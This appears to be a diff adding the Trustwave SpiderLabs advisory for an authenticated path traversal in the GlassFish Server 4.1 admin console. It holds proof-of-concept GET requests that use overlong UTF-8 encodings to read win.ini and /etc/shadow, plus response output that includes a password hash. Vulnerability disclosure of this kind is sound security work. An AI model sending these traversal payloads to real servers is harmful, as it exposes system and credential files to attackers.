@@ -1,0 +1,202 @@
+Trustwave SpiderLabs Security Advisory TWSL2015-016:
+Path Traversal in Oracle GlassFish Server Open Source Edition
+
+Published: 08/27/2015
+Version: 1.0
+
+Vendor: Oracle Corporation (Project sponsored by Oracle)
+Product: GlassFish Server Open Source Edition
+Version affected:  4.1 and prior versions
+
+Product description:
+Built using the GlassFish Server Open Source Edition, Oracle GlassFish
+Server delivers a flexible, lightweight and extensible Java EE 6 platform.
+It provides a small footprint, fully featured Java EE application server
+that is completely supported for commercial deployment and is available as
+a standalone offering.
+
+The Administration Console of Oracle GlassFish Server, which is listening
+by default on port 4848/TCP, is prone to a directory traversal
+vulnerability. This vulnerability can be exploited by remote attackers to
+access sensitive data on the server being authenticated.
+
+Finding 1: Directory traversal
+Credit: Piotr Karolak of Trustwave's SpiderLabs
+
+#Proof of Concept on Microsoft Windows installation
+
+The authenticated Directory Traversal vulnerability can be exploited by
+issuing a specially crafted HTTP GET request utilizing a simple bypass,
+%C0%2F instead of (/),URL encoding.
+
+Example:
+
+REQUEST
+========
+GET /theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini
+
+GET /theme/META-INF/json%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini
+
+GET /theme/META-INF/dojo%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini
+
+GET /theme/META-INF%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini
+
+GET /theme/com/sun%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini 
+
+GET /theme/com%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini
+
+Cookie: JSESSIONID=5c47a3575077b014449e17877a0c
+Accept-Language: en-US
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Referer: https://a.b.c.d:4848/
+Host: a.b.c.d:4848
+
+
+RESPONSE
+========
+HTTP/1.1 200 OK
+Server: GlassFish Server Open Source Edition  4.1
+X-Powered-By: Servlet/3.1 JSP/2.3 (GlassFish Server Open Source Edition  4.1  Java/Oracle Corporation/1.8)
+Last-Modified: Mon, 12 Jan 2015 10:00:00 GMT
+Transfer-Encoding: chunked
+
+; for 16-bit app support
+[fonts]
+[extensions]
+[mci extensions]
+[files]
+[Mail]
+MAPI=1
+CMCDLLNAME32=mapi32.dll
+CMC=1
+MAPIX=1
+MAPIXVER=1.0.0.1
+OLEMessaging=1
+[MCI Extensions.BAK]
+3g2=MPEGVideo
+3gp=MPEGVideo
+3gp2=MPEGVideo
+3gpp=MPEGVideo
+aac=MPEGVideo
+adt=MPEGVideo
+adts=MPEGVideo
+m2t=MPEGVideo
+m2ts=MPEGVideo
+m2v=MPEGVideo
+m4a=MPEGVideo
+m4v=MPEGVideo
+mod=MPEGVideo
+mov=MPEGVideo
+mp4=MPEGVideo
+mp4v=MPEGVideo
+mts=MPEGVideo
+ts=MPEGVideo
+tts=MPEGVideo
+
+The response contains the contents of the "win.ini" file, proving that the server allows remote users to download the contents of system files.
+
+
+#Proof of Concept on Linux installation
+
+Example:
+
+REQUEST
+=======
+
+GET /theme/META-INF/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afshadow/
+
+GET /theme/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afshadow HTTP/1.1
+Host: a.b.c.d:4848
+Accept: */*
+Accept-Language: en
+Connection: close
+
+RESPONSE
+========
+HTTP/1.1 200 OK
+Server: GlassFish Server Open Source Edition  4.1 
+X-Powered-By: Servlet/3.1 JSP/2.3 (GlassFish Server Open Source Edition  4.1  Java/Oracle Corporation/1.7)
+Last-Modified: Tue, 13 Jan 2015 10:00:00 GMT
+Date: Tue, 10 Jan 2015 10:00:00 GMT
+Connection: close
+Content-Length: 1087
+
+root:!:16436:0:99999:7:::
+daemon:*:16273:0:99999:7:::
+bin:*:16273:0:99999:7:::
+sys:*:16273:0:99999:7:::
+sync:*:16273:0:99999:7:::
+
+TRUNCATED
+
+lightdm:*:16273:0:99999:7:::
+colord:*:16273:0:99999:7:::
+hplip:*:16273:0:99999:7:::
+pulse:*:16273:0:99999:7:::
+test:$1$Duuk9PXN$IzWNTK/hPfl2jzhHmnrVL.:16436:0:99999:7:::
+smmta:*:16436:0:99999:7:::
+smmsp:*:16436:0:99999:7:::
+mysql:!:16436:0:99999:7:::
+
+Vendor Response:
+"We plan to fix this issue in the next major GlassFish Server Open Source
+Edition release."
+
+Remediation Steps:
+No fix is available at this time for the GlassFish Server Open Source
+Edition release. However, this vulnerability can be mitigated with the use
+of technologies, such as Web Application Firewalls (WAF) or Intrusion
+Prevention Systems (IPS).  Please note that Oracle GlassFish Server 3.x
+which is the current commercial release of GlassFish is not affected.
+
+Revision History:
+01/12/2015 - Vulnerability disclosed to vendor
+02/18/2015 - Notified vendor about the updates to TW security policy
+05/19/2015 - Ninety-day deadline exceeded
+07/14/2015 - Requested status from vendor
+07/31/2015 - Requested status from vendor
+08/21/2015 - Notified vendor about public disclosure
+08/27/2015 - Advisory published
+
+
+References
+1. https://www.owasp.org/index.php/Path_Traversal
+2. https://glassfish.java.net/
+3. http://www.oracle.com/us/products/middleware/cloud-app-foundation/glassfish-server/overview/index.html
+
+
+About Trustwave:
+Trustwave helps businesses fight cybercrime, protect data and reduce
+security risks. With cloud and managed security services, integrated
+technologies and a team of security experts, ethical hackers and
+researchers, Trustwave enables businesses to transform the way they manage
+their information security and compliance programs while safely embracing
+business imperatives including big data, BYOD and social media. More than
+2.5 million businesses are enrolled in the Trustwave TrustKeeper® cloud
+platform, through which Trustwave delivers automated, efficient and
+cost-effective data protection, risk management and threat intelligence.
+Trustwave is a privately held company, headquartered in Chicago, with
+customers in 96 countries. For more information about Trustwave, visit
+www.trustwave.com.
+
+About Trustwave SpiderLabs:
+SpiderLabs(R) is the advanced security team at Trustwave focused on
+application security, incident response, penetration testing, physical
+security and security research. The team has performed over a thousand
+incident investigations, thousands of penetration tests and hundreds of
+application security tests globally. In addition, the SpiderLabs Research
+team provides intelligence through bleeding-edge research and proof of
+concept tool development to enhance Trustwave's products and services.
+https://www.trustwave.com/spiderlabs
+
+Disclaimer:
+The information provided in this advisory is provided "as is" without
+warranty of any kind. Trustwave disclaims all warranties, either express or
+implied, including the warranties of merchantability and fitness for a
+particular purpose. In no event shall Trustwave or its suppliers be liable
+for any damages whatsoever including direct, indirect, incidental,
+consequential, loss of business profits or special damages, even if
+Trustwave or its suppliers have been advised of the possibility of such
+damages. Some states do not allow the exclusion or limitation of liability
+for consequential or incidental damages so the foregoing limitation may not
+apply.
